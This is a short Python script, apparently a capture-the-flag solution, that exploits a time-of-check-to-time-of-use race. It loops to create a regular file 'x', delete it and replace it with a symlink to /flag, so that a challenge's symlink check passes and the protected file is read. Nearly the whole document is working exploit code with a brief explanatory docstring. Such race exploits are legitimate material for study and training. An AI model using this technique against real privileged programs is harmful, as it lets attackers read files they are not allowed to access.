import os

"""
Theres a check to see if a file its a symlink. To bypass this, we create a regular
file 'x' and quickly remove and create a symlink to /flag with the same name.
When we win the race, the challenge will be tricked to think that x it is a regular
file (was when the challenge checked).
"""

while True:
    try:
        os.unlink("x")
    except FileNotFoundError:
        pass

    file_descriptor = os.open("x", os.O_WRONLY|os.O_CREAT) # create a regular file
    os.close(file_descriptor)
    os.unlink("x") # remove the regular file
    os.symlink("/flag", "x") # make the x file a symlink to flag
